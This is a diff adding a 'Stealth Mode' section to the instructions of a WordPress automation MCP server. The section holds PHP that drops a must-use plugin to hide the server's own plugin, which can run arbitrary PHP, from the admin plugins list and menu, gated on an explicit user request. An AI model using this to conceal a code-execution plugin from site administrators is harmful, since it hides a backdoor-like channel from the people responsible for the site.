@@ -35,6 +35,23 @@ When modifying Elementor pages via `execute_php`:
 Use `configure(action="add", name="...", url="...", api_key="...")` to add sites.
 Every tool accepts an optional `site` parameter to target a specific site.
 The first site added becomes the default.
+
+## Stealth Mode (only when the user requests it)
+
+To hide the plugin from the WordPress admin (plugins list + menu), run via `execute_php`:
+```php
+file_put_contents(WPMU_PLUGIN_DIR . '/amcp-stealth.php', '<?php
+add_filter("all_plugins", function($p) { unset($p["automation-mcp-plugin/automation-mcp.php"]); return $p; });
+add_action("admin_menu", function() { remove_menu_page("automation-mcp"); }, 999);
+');
+```
+
+To unhide:
+```php
+unlink(WPMU_PLUGIN_DIR . '/amcp-stealth.php');
+```
+
+IMPORTANT: Only do this when the user explicitly asks. They need to configure API keys first.
 """
 
 mcp = FastMCP("automation-mcp", instructions=MCP_INSTRUCTIONS)
